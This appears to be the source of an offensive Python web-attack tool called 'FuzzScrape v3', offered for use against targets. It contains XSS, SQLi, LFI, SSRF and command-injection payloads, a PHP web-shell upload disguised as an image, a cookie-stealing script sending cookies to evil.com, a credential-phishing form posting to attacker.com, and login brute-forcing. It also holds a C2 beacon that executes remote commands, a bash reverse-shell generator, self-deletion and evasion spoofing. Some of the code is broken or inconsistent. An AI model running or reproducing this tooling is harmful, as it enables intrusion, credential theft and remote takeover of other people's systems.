import os, re, sys, time, json, random, asyncio, aiohttp, base64, urllib.parse, requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from asyncio_throttle import Throttler
import socket
from urllib.parse import urlparse
from cryptography.fernet import Fernet
import pyfiglet
from halo import Halo
import platform
import ast
import ssl
import mitmproxy.http
import OpenSSL.crypto
import codecs

init(autoreset=True)

if "android" in platform.platform().lower():
    print(Fore.YELLOW + "[!] Detected Android/Termux environment")

OUTPUT_DIR = 'output'
os.makedirs(OUTPUT_DIR, exist_ok=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0"
]

referer_list = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://www.duckduckgo.com"
]

HEADERS = lambda: {
    'User-Agent': random.choice(USER_AGENTS),
    'x-Requested-With': 'XMLHttpRequest',
    'X-Forwarded-For': f"127.0.0.{random.randint(1,254)}",
    'Referer': random.choice(referer_list),
    'DNT': '1',
    'Accept-Language': 'en-US,en;q=0.9',
    'Sec-Fetch-Dest': 'document'
}

throttler = Throttler(rate_limit=5)
timeout = aiohttp.ClientTimeout(total=15)
session = {
    "target": "",
    "creds": {},
    "cookies": {},
    "key": None
}

help_dict = {
    "xss": "Scan & fuzz reflected/DOM XSS",
    "sqli": "SQL Injection testing",
    "brute": "Bruteforce login form",
    "upload": "Upload shell and trigger",
    "admin": "Find admin panels",
    "shell": "Inject beacon and control",
    "beacon": "Beacon loop for C2",
    "chain": "Chain multiple modes",
    "recon": "Recon & endpoint discovery",
    "subdomain": "Subdomain scanner",
    "open_dir": "Open directory detection",
    "stealth": "Stealth & noise reduction",
    "mutation": "Payload mutation engine",
    "auto_chain": "Auto exploit chaining",
    "dork": "Google dorking for targets",
    "manual": "Interactive CLI mode",
    "listen": "Listen for remote commands",
    "self-destruct": "Delete self after run",
    "update": "Check for updates",
    "wayback": "Wayback Machine mining",
    "csp": "CSP & headers analysis",
    "js_endpoints": "JS endpoint discovery",
    "smuggling": "HTTP smuggling detection",
    "ssrf": "SSRF exploitation",
    "dom_xss_launch": "DOM XSS launcher",
    "cors": "CORS misconfiguration exploit",
    "rce_upload": "RCE via file upload",
    "adv_sqli": "Advanced SQLi payloads",
    "bypass_403": "Bypass 403 restrictions",
    "header_poison": "Header poisoning for WAF bypass",
    "js_brute": "Brute force sensitive keys in JS",
    "endpoint_discovery": "Discover endpoints via robots.txt, sitemap.xml, .git, .env",
    "upload_bypass": "Bypass upload restrictions",
    "rev_shell": "Reverse shell",
    "remote_task": "Remote task execution",
    "path_discovery": "Path discovery",
    "open_redirect": "Open redirect detection",
    "host_header_injection": "Host header injection",
    "jsonp": "JSONP exploitation",
    "command_injection": "Command injection via headers",
    "lfi": "Local File Inclusion testing",
    "xxe": "XML External Entity testing",
    "rce": "Remote Command Execution testing",
    "ssti": "Server Side Template Injection testing"
}

def banner():
    print(pyfiglet.figlet_format("FuzzScrape v3"))
    spinner = Halo(text='Launching', spinner='dots')
    spinner.start()
    asyncio.run(menu_mode())
    spinner.succeed("Ready")

def is_valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.scheme) and bool(parsed.netloc)

def save_output(mode, data):
    with open(f"output/{mode}.txt", "a") as f:
        f.write(data + "\n")

def encrypt_data(data):
    key = Fernet.generate_key()
    f = Fernet(key)
    encrypted = f.encrypt(data.encode())
    session["key"] = key
    return encrypted, key

def decrypt_data(token, key):
    try:
        f = Fernet(key)
        decrypted = f.decrypt(token.encode()).decode()
        return decrypted
    except Exception as e:
        print(f"[!] Failed to decrypt: {e}")
        return None

def html_encode(payload):
    return ''.join(['&#%d;' % ord(c) for c in payload])

def php_rot13(payload):
    return "eval(str_rot13('" + codecs.encode(payload, 'rot_13') + "'));"

async def fetch(client, url, method='GET', **kwargs):
    async with throttler:
        try:
            async with client.request(method, url, headers=HEADERS(), **kwargs) as r:
                return await r.text(), r.status, dict(r.headers)
        except aiohttp.ClientError as e:
            print(Fore.YELLOW + f"[!] Request Error: {e}")
            return str(e), 0, {}

def mutate_payload(payload):
    mutations = [
        payload,
        payload.replace('<', '&#60;').replace('>', '&#62;'),
        payload.replace('alert', 'eval(String.fromCharCode(97,108,101,114,116))'),
        payload.replace('alert', 'Function("al"+ "ert")()'),
        payload.replace('<script>', '<scr\0ipt>').replace('</script>', '</scr\0ipt>'),
        payload.replace('=', '＝')
    ]
    return random.choice(mutations)

async def stealth_inject(client, url, payload, delay=2, headers=None):
    if headers is None:
        headers = HEADERS()
    headers.update({
        'Referer': url,
        'X-Forwarded-For': f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"
    })
    await asyncio.sleep(delay)
    html, _, _ = await fetch(client, f"{url}?search={urllib.parse.quote_plus(payload)}", headers=headers)
    return html

async def xss_fuzz(client, url):
    print(Fore.CYAN + f"[XSS] Target: {url}")
    payloads = ['<script>alert(1)</script>', '" onerror=alert(1) ', "'><svg/onload=alert(1)>"]
    for p in payloads:
        mutated_payload = mutate_payload(p)
        html = await stealth_inject(client, url, mutated_payload)
        if mutated_payload in html:
            print(Fore.RED + f"[!] XSS Found: {url} with payload: {mutated_payload}")
            save_output('xss', f"{url} with payload: {mutated_payload}")
            log("xss", f"{url} with payload: {mutated_payload}")

async def scrape_links(client, url):
    print(Fore.CYAN + f"[SCRAPE] {url}")
    html, _, _ = await fetch(client, url)
    soup = BeautifulSoup(html, 'html.parser')
    links = {urllib.parse.urljoin(url, a['href']) for a in soup.find_all('a', href=True)}
    for l in sorted(links):
        print(Fore.GREEN + l)
        save_output('scraped_links', l)
    print(Fore.YELLOW + f"[*] Total Links Found: {len(links)}")

async def dom_xss_check(client, url):
    html, _, _ = await fetch(client, url)
    patterns = [r"<script>.*?alert\$1$.*?</script>", r"onerror\s*=\s*alert"]
    if any(re.search(pat, html, re.I) for pat in patterns):
        print(Fore.RED + f"[!] Potential DOM XSS Found: {url}")
        save_output("dom_xss", url)

async def lfi_check(client, url):
    paths = ["../../etc/passwd", "../../../boot.ini", "../config.php"]
    for path in paths:
        test_url = f"{url}?file={urllib.parse.quote_plus(path)}"
        html, _, _ = await fetch(client, test_url)
        if "root:" in html or "boot loader" in html:
            print(Fore.RED + f"[!] LFI Detected: {test_url}")
            save_output('lfi', test_url)

async def admin_panel_fuzz(client, url):
    print(Fore.CYAN + f"[ADMIN PANEL] Target: {url}")
    admin_paths = ['/admin', '/login', '/wp-admin', '/administrator', '/dashboard', '/admin.php', '/adm/', '/manager/', '/controlpanel/', '/user/', '/users/', '/account/', '/cp/', '/ucp/', '/panel/', '/wp-login.php']
    for path in admin_paths:
        test_url = urllib.parse.urljoin(url, path)
        html, status, _ = await fetch(client, test_url)
        if status == 200 and any(keyword in html.lower() for keyword in ["login", "admin", "dashboard", "control panel", "user", "account"]):
            print(Fore.RED + f"[!] Potential Admin Panel Found: {test_url}")
            save_output('admin_panels', test_url)
            session["admin_panel"] = test_url
            return {"admin": test_url}

async def phishing_attack(client, url):
    print(Fore.CYAN + f"[PHISHING] Target: {url}")
    phishing_payload = "<form action='http://attacker.com/collect' method='post'><input type='text' name='username'><input type='password' name='password'><input type='submit'></form>"
    test_url = f"{url}/phishing"
    html, status, _ = await fetch(client, test_url, method='POST', data={'html': phishing_payload})
    if status == 200:
        print(Fore.RED + f"[!] Phishing Page Deployed: {test_url}")
        save_output('phishing', test_url)

async def mitm_attack(client, url):
    print(Fore.CYAN + f"[MITM] Target: {url}")
    mitm_payload = "Your MITM payload here"
    test_url = f"{url}/mitm"
    html, status, _ = await fetch(client, test_url, method='POST', data={'payload': mitm_payload})
    if status == 200:
        print(Fore.RED + f"[!] MITM Attack Successful: {test_url}")
        save_output('mitm', test_url)

async def port_scan(client, url, ports):
    print(Fore.CYAN + f"[PORT SCAN] Target: {url}")
    scheme = url.split("://")[0]
    host = url.replace(scheme + "://", "")
    for port in ports:
        test_url = f"{scheme}://{host}:{port}"
        try:
            async with client.get(test_url, timeout=5) as response:
                if response.status == 200:
                    print(Fore.RED + f"[!] Open Port Found: {test_url}")
                    save_output('open_ports', test_url)
        except (aiohttp.ClientError, asyncio.TimeoutError):
            continue

async def gather_info(client, url):
    print(Fore.CYAN + f"[GATHER INFO] Target: {url}")
    html, _, _ = await fetch(client, url)
    soup = BeautifulSoup(html, 'html.parser')
    title = soup.title.string if soup.title else "No Title"
    meta_tags = soup.find_all('meta')
    description = ""
    keywords = ""
    for tag in meta_tags:
        if tag.get('name') == 'description':
            description = tag.get('content', '')
        elif tag.get('name') == 'keywords':
            keywords = tag.get('content', '')
    print(Fore.YELLOW + f"[*] Title: {title}")
    print(Fore.YELLOW + f"[*] Description: {description}")
    print(Fore.YELLOW + f"[*] Keywords: {keywords}")
    save_output('gathered_info', f"URL: {url}\nTitle: {title}\nDescription: {description}\nKeywords: {keywords}\n")

async def sqli_fuzz(client, url):
    print(Fore.CYAN + f"[SQLi] Target: {url}")
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "admin' --", "admin' #", "admin'/*"]
    for p in payloads:
        test_url = f"{url}?id={urllib.parse.quote_plus(p)}"
        html, status, _ = await fetch(client, test_url)
        if "sql syntax" in html.lower() or "mysql_error" in html.lower() or "postgres_error" in html.lower():
            print(Fore.RED + f"[!] SQLi Detected: {test_url}")
            save_output('sqli', test_url)

async def open_redirect(client, url):
    print(Fore.CYAN + f"[OPEN REDIRECT] Target: {url}")
    payloads = ["?next=http://evil.com", "?return=http://evil.com", "?url=http://evil.com"]
    for p in payloads:
        test_url = f"{url}{p}"
        html, status, headers = await fetch(client, test_url)
        if "location" in headers and "evil.com" in headers["location"]:
            print(Fore.RED + f"[!] Open Redirect Detected: {test_url}")
            save_output('open_redirect', test_url)

async def host_header_injection(client, url):
    print(Fore.CYAN + f"[HOST HEADER INJECTION] Target: {url}")
    payloads = ["localhost", "127.0.0.1", "internal-server"]
    for p in payloads:
        headers = HEADERS()
        headers["Host"] = p
        html, status, _ = await fetch(client, url, headers=headers)
        if "internal" in html.lower() or "localhost" in html.lower():
            print(Fore.RED + f"[!] Host Header Injection Detected: {url} with Host: {p}")
            save_output('host_header_injection', f"{url} with Host: {p}")

async def jsonp_exploit(client, url):
    print(Fore.CYAN + f"[JSONP] Target: {url}")
    payloads = ["?callback=evil", "?jsonp=evil"]
    for p in payloads:
        test_url = f"{url}{p}"
        html, status, _ = await fetch(client, test_url)
        if "evil(" in html:
            print(Fore.RED + f"[!] JSONP Exploit Detected: {test_url}")
            save_output('jsonp', test_url)

async def command_injection(client, url):
    print(Fore.CYAN + f"[COMMAND INJECTION] Target: {url}")
    payloads = ["; ping -c 1 evil.com", "; echo evil"]
    for p in payloads:
        test_url = f"{url}?cmd={urllib.parse.quote_plus(p)}"
        html, status, _ = await fetch(client, test_url)
        if "evil" in html:
            print(Fore.RED + f"[!] Command Injection Detected: {test_url}")
            save_output('command_injection', test_url)

async def subdomain_scanner(client, url, subdomains):
    print(Fore.CYAN + f"[SUBDOMAIN SCANNER] Target: {url}")
    for subdomain in subdomains:
        test_url = f"http://{subdomain}.{url}"
        try:
            async with client.get(test_url, timeout=5) as response:
                if response.status == 200:
                    print(Fore.RED + f"[!] Subdomain Found: {test_url}")
                    save_output('subdomains', test_url)
        except (aiohttp.ClientError, asyncio.TimeoutError):
            continue

async def webshell_uploader(client, url, shell_path):
    print(Fore.CYAN + f"[WEBSHELL UPLOADER] Target: {url}")
    if not os.path.isfile(shell_path):
        print(Fore.RED + f"[!] File not found: {shell_path}")
        return
    with open(shell_path, 'r') as f:
        shell_content = f.read()
    form = aiohttp.FormData()
    form.add_field('file', shell_content, filename='image.png', content_type='image/png')
    test_url = f"{url}/upload"
    html, status, _ = await fetch(client, test_url, method='POST', data=form)
    if status == 200 and "upload successful" in html.lower():
        print(Fore.RED + f"[!] Webshell Uploaded: {test_url} " )
        save_output('webshell', test_url)
        session["shell_uploaded"] = test_url

async def admin_login_bruteforce(client, url, credentials):
    print(Fore.CYAN + f"[ADMIN LOGIN BRUTEFORCE] Target: {url}")
    for cred in credentials:
        data = {'username': cred[0], 'password': cred[1]}
        html, status, _ = await fetch(client, url, method='POST', data=data)
        if "dashboard" in html.lower() or "admin panel" in html.lower():
            print(Fore.RED + f"[!] Admin Login Successful: {cred[0]}:{cred[1]}")
            save_output('admin_login', f"{cred[0]}:{cred[1]}")
            session["brute_success"] = True
            return {"brute_success": True}

async def js_file_parser(client, url):
    print(Fore.CYAN + f"[JS FILE PARSE] Target: {url}")
    try:
        html, _, _ = await fetch(client, url)
        soup = BeautifulSoup(html, 'html.parser')
        js_files = [urllib.parse.urljoin(url, script['src']) for script in soup.find_all('script', src=True)]
        for js_file in js_files:
            js_content, _, _ = await fetch(client, js_file)
            if "api_key" in js_content or "secret" in js_content:
                print(Fore.RED + f"[!] Sensitive Info Found in JS: {js_file}")
                save_output('js_parsers', js_file)
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error parsing JS files: {e}")

async def advanced_sqli_fuzz(client, url):
    print(Fore.CYAN + f"[ADVANCED SQLi] Target: {url}")
    payloads = ["' OR SLEEP(5) --", "' UNION SELECT NULL, version()--", "' AND '1'='1"]
    for p in payloads:
        test_url = f"{url}?id={urllib.parse.quote_plus(p)}"
        start_time = time.time()
        html, status, _ = await fetch(client, test_url)
        end_time = time.time()
        if end_time - start_time > 5 or "mysql" in html.lower() or "postgres" in html.lower():
            print(Fore.RED + f"[!] Advanced SQLi Detected: {test_url}")
            save_output('advanced_sqli', test_url)

async def rce_via_file_upload(client, url):
    print(Fore.CYAN + f"[RCE VIA FILE UPLOAD] Target: {url}")
    shell_content = '<?php system($_GET["cmd"]); ?>'
    form = aiohttp.FormData()
    form.add_field('file', shell_content, filename='shell.php', content_type='image/jpeg')
    test_url = f"{url}/upload"
    html, status, _ = await fetch(client, test_url, method='POST', data=form)
    if status == 200:
        print(Fore.RED + f"[!] File Uploaded: {test_url}")
        save_output('rce_upload', test_url)

async def cors_misconfig_exploit(client, url):
    print(Fore.CYAN + f"[CORS MISCONFIG] Target: {url}")
    headers = HEADERS()
    headers["Origin"] = "https://evil.com"
    html, status, response_headers = await fetch(client, url, headers=headers)
    if "Access-Control-Allow-Origin" in response_headers and response_headers["Access-Control-Allow-Origin"] == "*":
        print(Fore.RED + f"[!] CORS Misconfiguration Detected: {url}")
        save_output('cors_misconfig', url)

async def dom_xss_launcher(client, url):
    print(Fore.CYAN + f"[DOM XSS LAUNCHER] Target: {url}")
    payload = "<script>window.location='//evil.com?c='+document.cookie</script>"
    test_url = f"{url}?q={urllib.parse.quote_plus(payload)}"
    html, status, _ = await fetch(client, test_url)
    if payload in html:
        print(Fore.RED + f"[!] DOM XSS Launched: {test_url}")
        save_output('dom_xss_launcher', test_url)

async def ssrf_exploit(client, url):
    print(Fore.CYAN + f"[SSRF] Target: {url}")
    payloads = ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/"]
    for p in payloads:
        test_url = f"{url}?url={urllib.parse.quote_plus(p)}"
        html, status, _ = await fetch(client, test_url)
        if "instance-id" in html or "127.0.0.1" in html:
            print(Fore.RED + f"[!] SSRF Detected: {test_url}")
            save_output('ssrf', test_url)

async def http_smuggling_detect(client, url):
    print(Fore.CYAN + f"[HTTP SMUGGLING] Target: {url}")
    smuggling_payload = (
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n\r\n"
        "0\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: target.com\r\n\r\n"
    )
    headers = HEADERS()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    html, status, _ = await fetch(client, url, method='POST', headers=headers, data=smuggling_payload)
    if status == 200 and "admin" in html:
        print(Fore.RED + f"[!] HTTP Smuggling Detected: {url}")
        save_output('http_smuggling', url)

async def js_endpoint_discovery(client, url):
    print(Fore.CYAN + f"[JS ENDPOINT DISCOVERY] Target: {url}")
    html, _, _ = await fetch(client, url)
    soup = BeautifulSoup(html, 'html.parser')
    js_files = [script['src'] for script in soup.find_all('script', src=True)]
    endpoints = set()
    for js_file in js_files:
        js_content, _, _ = await fetch(client, js_file)
        endpoints.update(re.findall(r'fetch$["\'](.*?)["\']$', js_content))
    for endpoint in endpoints:
        print(Fore.GREEN + f"[*] Discovered Endpoint: {endpoint}")
        save_output('js_endpoints', endpoint)

async def wayback_machine_mining(client, url):
    print(Fore.CYAN + f"[WAYBACK MACHINE] Target: {url}")
    try:
        from waybackpy import WaybackMachine
        wayback = WaybackMachine()
        urls = wayback.urls(url, limit=10)
        for entry in urls:
            print(Fore.GREEN + f"[*] Archived URL: {entry['url']}")
            save_output('wayback_urls', entry['url'])
    except Exception as e:
        print(Fore.YELLOW + f"[!] WaybackMachine error: {e}")
        print(Fore.YELLOW + "[!] 'waybackpy' module not found.")

async def csp_headers_analysis(client, url):
    print(Fore.CYAN + f"[CSP & HEADERS ANALYSIS] Target: {url}")
    html, _, headers = await fetch(client, url)
    csp = headers.get('Content-Security-Policy', 'No CSP Found')
    x_frame_options = headers.get('X-Frame-Options', 'No X-Frame-Options Found')
    access_control_allow_origin = headers.get('Access-Control-Allow-Origin', 'No Access-Control-Allow-Origin Found')
    print(Fore.YELLOW + f"[*] Content-Security-Policy: {csp}")
    print(Fore.YELLOW + f"[*] X-Frame-Options: {x_frame_options}")
    print(Fore.YELLOW + f"[*] Access-Control-Allow-Origin: {access_control_allow_origin}")
    save_output('csp_headers', f"URL: {url}\nCSP: {csp}\nX-Frame-Options: {x_frame_options}\nAccess-Control-Allow-Origin: {access_control_allow_origin}\n")

async def open_directory_scanner(client, url):
    print(Fore.CYAN + f"[OPEN DIRECTORY SCANNER] Target: {url}")
    directories = ['/uploads/', '/backups/', '/config/']
    for directory in directories:
        test_url = urllib.parse.urljoin(url, directory)
        html, status, _ = await fetch(client, test_url)
        if "Index of" in html or "Directory listing" in html:
            print(Fore.RED + f"[!] Open Directory Found: {test_url}")
            save_output('open_directories', test_url)

async def beacon_loop(client, c2_url, interval=10):
    while True:
        html, _, _ = await fetch(client, f"{c2_url}/commands")
        if "exec:" in html:
            command = html.split("exec:")[1].strip()
            os.system(command)
        await asyncio.sleep(interval)

async def path_discovery(client, url):
    keywords = ['admin', 'conf', 'config', 'debug', 'logs', 'users', 'system']
    for word in keywords:
        path = f"{url}/{word}/"
        html, status, _ = await fetch(client, path)
        if "Index of" in html:
            save_output('path_discovery', path)

async def remote_task_exec(client, c2_url, target_url):
    tasks, _, _ = await fetch(client, f"{c2_url}/task.json")
    try:
        cmds = json.loads(tasks)
        for cmd in cmds:
            if cmd['type'] == 'xss':
                await xss_fuzz(client, target_url)
            elif cmd['type'] == 'brute':
                await admin_login_bruteforce(client, target_url, cmd['creds'])
    except Exception as e:
        print(f"[!] Task Error: {e}")

async def rev_shell(ip, port):
    bash = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    encoded_bash = base64.b64encode(bash.encode()).decode()
    print("Payload:", encoded_bash)

async def run_chain(sequence, client, url):
    for step in sequence.split(","):
        if step in help_dict:
            await globals()[step](client, url)

async def run_target(client, url, mode, ports=None, subdomains=None, shell_path=None, credentials=None, c2_url=None, interval=None, delay=None, headers=None, payload=None, encode=None, obfuscate=None, ip=None, port=None, listen=False, webhook=None, unlock=None, silent=False, json_output=False, chain_report=False, query=None):
    if not url.startswith(('http://', 'https://')):
        print(Fore.RED + f"[!] Invalid URL format: {url}")
        return
    if mode == "xss":
        await xss_fuzz(client, url)
    elif mode == "scrape":
        await scrape_links(client, url)
    elif mode == "domxss":
        await dom_xss_check(client, url)
    elif mode == "lfi":
        await lfi_check(client, url)
    elif mode == "admin":
        result = await admin_panel_fuzz(client, url)
        if result and result.get("admin"):
            session["admin_panel"] = result["admin"]
    elif mode == "phish":
        await phishing_attack(client, url)
    elif mode == "mitm":
        await mitm_attack(client, url)
    elif mode == "scan":
        await port_scan(client, url, ports)
    elif mode == "info":
        await gather_info(client, url)
    elif mode == "sqli":
        await sqli_fuzz(client, url)
    elif mode == "redirect":
        await open_redirect(client, url)
    elif mode == "host":
        await host_header_injection(client, url)
    elif mode == "jsonp":
        await jsonp_exploit(client, url)
    elif mode == "cmd":
        await command_injection(client, url)
    elif mode == "subdomain":
        await subdomain_scanner(client, url, subdomains)
    elif mode == "webshell":
        await webshell_uploader(client, url, shell_path)
    elif mode == "brute":
        result = await admin_login_bruteforce(client, url, credentials)
        if result and result.get("brute_success"):
            session["brute_success"] = True
    elif mode == "jsparse":
        await js_file_parser(client, url)
    elif mode == "adv_sqli":
        await advanced_sqli_fuzz(client, url)
    elif mode == "rce_upload":
        await rce_via_file_upload(client, url)
    elif mode == "cors":
        await cors_misconfig_exploit(client, url)
    elif mode == "dom_xss_launch":
        await dom_xss_launcher(client, url)
    elif mode == "ssrf":
        await ssrf_exploit(client, url)
    elif mode == "smuggling":
        await http_smuggling_detect(client, url)
    elif mode == "js_endpoints":
        await js_endpoint_discovery(client, url)
    elif mode == "wayback":
        await wayback_machine_mining(client, url)
    elif mode == "csp":
        await csp_headers_analysis(client, url)
    elif mode == "open_dir":
        await open_directory_scanner(client, url)
    elif mode == "beacon":
        asyncio.create_task(beacon_loop(client, c2_url, interval))
    elif mode == "path_discovery":
        await path_discovery(client, url)
    elif mode == "remote_task":
        await remote_task_exec(client, c2_url, url)
    elif mode == "rev_shell":
        asyncio.create_task(rev_shell(ip, port))
    elif mode == "chain":
        await run_chain(sequence=mode, client=client, url=url)
    elif mode == "dork":
        print(Fore.CYAN + f"[DORK] Query: {query}")
        search_url = f"https://www.google.com/search?q={urllib.parse.quote_plus(query)}"
        html, _, _ = await fetch(client, search_url)
        soup = BeautifulSoup(html, 'html.parser')
        links = [a['href'] for a in soup.find_all('a', href=True) if 'url?q=' in a['href'] and 'webcache' not in a['href']]
        for link in links:
            print(Fore.GREEN + link)
            save_output('dork_results', link)
    elif mode == "manual":
        while True:
            print("\n[1] XSS\n[2] Brute\n[3] Upload\n[4] Chain\n[Q] Quit")
            ch = input(">> ").strip().lower()
            if ch == 'q': break
            elif ch == '4':
                sequence = input("Enter chain sequence (e.g., recon,admin,brute,upload,shell,beacon): ").strip()
                await run_chain(sequence, client, url)
            else:
                await run_target(client, url, ch)
    elif mode == "listen":
        if listen:
            # Implement listening for remote commands here
            pass
    elif mode == "self-destruct":
        if unlock == os.environ.get("FZ_KEY"):
            await run_target(client, url, "chain", sequence="recon,admin,brute,upload,shell,beacon")
            os.remove(__file__)
        else:
            print(Fore.RED + "[!] Access denied. Incorrect key.")
    elif mode == "update":
        check_update()
    else:
        print(Fore.YELLOW + "[!] Unknown mode")

def check_update():
    r = requests.get("https://raw.githubusercontent.com/your-username/your-repo-name/main/version.txt")
    local_version = "1.0.0"  # Replace with your local version
    if r.text.strip() != local_version:
        print("Update available. Pulling...")
        os.system("git pull")

def log(mode, text):
    with open(f"output/{mode}.txt", "a") as f:
        f.write(text + "\n")

async def menu_mode():
    banner()
    while True:
        print(Fore.CYAN + "\n=== SELECT MODE ===")
        for key, value in help_dict.items():
            print(f"[{key:<18}] → {value}")
        print("[99] Manual CLI Input Mode")
        print("[88] Load Profile Preset")
        print("[L] Replay Last Run")
        print("[Q] Quit")
        try:
            choice = input("Choose mode: ").strip().lower()
            if choice == "q":
                print("Exiting... Stay stealth. 💀")
                return
            elif choice == "l":
                if os.path.exists(".last_run"):
                    with open(".last_run", "r") as f:
                        last_run = f.read().strip()
                        mode, url, args = last_run.split(" ", 2)
                        await run_target(None, url, mode, *args.split())
                else:
                    print(Fore.YELLOW + "[!] No last run found.")
            elif choice == "99":
                mode_url_args = input("Manual CLI Input (format: mode url [args...]): ").strip()
                mode, url, *args = mode_url_args.split(" ", 2)
                await run_target(None, url, mode, *args)
            elif choice == "88":
                print("Available Profiles: bank, stealth, recon_all")
                profile = input(">> Pilih profile: ").strip().lower()
                url = input(">> Target URL: ").strip()
                if profile == "bank":
                    sequence = "recon,admin,brute,upload,shell,beacon"
                elif profile == "stealth":
                    sequence = "recon,admin,brute,upload,shell,beacon,stealth"
                elif profile == "recon_all":
                    sequence = "recon,admin,brute,upload,shell,beacon,stealth,mutation,auto_chain"
                else:
                    print(Fore.YELLOW + "[!] Unknown profile.")
                    continue
                await run_chain(sequence, None, url)
            else:
                url = input("Target URL (http/https): ").strip()
                if not is_valid_url(url):
                    print(Fore.RED + "[!] Invalid URL format.")
                    continue
                if choice == "scan":
                    ports = list(map(int, input("Enter ports to scan (comma separated): ").strip().split(",")))
                    await run_target(None, url, choice, ports=ports)
                elif choice == "subdomain":
                    subdomains = input("Enter subdomains to scan (comma separated): ").strip().split(",")
                    await run_target(None, url, choice, subdomains=subdomains)
                elif choice == "webshell":
                    shell_path = input("Enter path to the webshell: ").strip()
                    await run_target(None, url, choice, shell_path=shell_path)
                elif choice == "brute":
                    try:
                        credentials = ast.literal_eval(input("Enter credentials list (e.g., [('admin','123')]): ").strip())
                    except Exception as e:
                        print(Fore.RED + f"[!] Failed to parse credentials: {e}")
                        continue
                    await run_target(None, url, choice, credentials=credentials)
                elif choice == "beacon":
                    c2_url = input("Enter C2 URL: ").strip()
                    interval = int(input("Enter beacon interval (seconds): ").strip())
                    await run_target(None, url, choice, c2_url=c2_url, interval=interval)
                elif choice == "remote_task":
                    c2_url = input("Enter C2 JSON URL: ").strip()
                    await run_target(None, url, choice, c2_url=c2_url)
                elif choice == "rev_shell":
                    ip = input("Enter IP: ").strip()
                    port = int(input("Enter Port: ").strip())
                    await run_target(None, url, choice, ip=ip, port=port)
                elif choice == "chain":
                    sequence = input("Enter chain sequence (e.g., recon,admin,brute,upload,shell,beacon): ").strip()
                    await run_chain(sequence, None, url)
                elif choice == "dork":
                    query = input("Enter Google dork query: ").strip()
                    await run_target(None, url, choice, query=query)
                else:
                    await run_target(None, url, choice)
                with open(".last_run", "w") as f:
                    f.write(f"{choice} {url} {' '.join(args)}")
                print(Fore.GREEN + f"[✔] Mode {choice} completed!")
                input("\n[ENTER] to return to menu")
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")
            input("\n[ENTER] to return to menu")

if __name__ == "__main__":
    if len(sys.argv) == 1:
        import asyncio
        asyncio.run(menu_mode())
        sys.exit()
    else:
        args = sys.argv[1:]
        if len(args) < 2:
            print(Fore.YELLOW + "[!] Usage: python fuzzscrape.py <mode> <url> [options]")
            print(Fore.YELLOW + "[!] Example: python fuzzscrape.py xss http://example.com")
            sys.exit(1)

        mode = args[0]
        url = args[1]
        if mode not in help_dict:
            print(Fore.YELLOW + "[!] Unknown mode")
            sys.exit(1)

        async with aiohttp.ClientSession(timeout=timeout) as client:
            if mode == "scan":
                ports = list(map(int, args[2].split(",")))
                await run_target(client, url, mode, ports=ports)
            elif mode == "subdomain":
                subdomains = args[2].split(",")
                await run_target(client, url, mode, subdomains=subdomains)
            elif mode == "webshell":
                shell_path = args[2]
                await run_target(client, url, mode, shell_path=shell_path)
            elif mode == "brute":
                try:
                    credentials = ast.literal_eval(args[2])
                except Exception as e:
                    print(Fore.RED + f"[!] Failed to parse credentials: {e}")
                    sys.exit(1)
                await run_target(client, url, mode, credentials=credentials)
            elif mode == "beacon":
                c2_url = args[2]
                interval = int(args[3])
                await run_target(client, url, mode, c2_url=c2_url, interval=interval)
            elif mode == "remote_task":
                c2_url = args[2]
                await run_target(client, url, mode, c2_url=c2_url)
            elif mode == "rev_shell":
                ip = args[2]
                port = int(args[3])
                await run_target(client, url, mode, ip=ip, port=port)
            elif mode == "chain":
                sequence = args[2]
                await run_target(client, url, mode, sequence=sequence)
            elif mode == "dork":
                query = args[2]
                await run_target(client, url, mode, query=query)
            elif mode == "manual":
                await run_target(client, url, mode)
            elif mode == "listen":
                await run_target(client, url, mode, listen=True)
            elif mode == "self-destruct":
                unlock = args[2]
                await run_target(client, url, mode, unlock=unlock)
            elif mode == "update":
                check_update()
            else:
                await run_target(client, url, mode)

### Additional Stealth Features

1. **JA3 TLS Fingerprint Spoofing:**
   ```python
   import ssl
   import mitmproxy.http

   def ja3_spoof():
       class Ja3Spoof:
           def __init__(self, ja3_string):
               self.ja3_string = ja3_string

           def __call__(self, flow: mitmproxy.http.HTTPFlow) -> None:
               flow.request.headers["User-Agent"] = self.ja3_string

       return Ja3Spoof("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")

   ja3_spoofer = ja3_spoof()
   
   import OpenSSL.crypto

def spoof_tls_ciphers():
    ciphers = (
        "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384"
    )
    return ciphers
def mask_tls_session_resumption():
    ctx = ssl.create_default_context()
    ctx.session_cache_size = 0
    return ctx
def spoof_http2_upgrade():
    headers = {
        "Upgrade": "h2c",
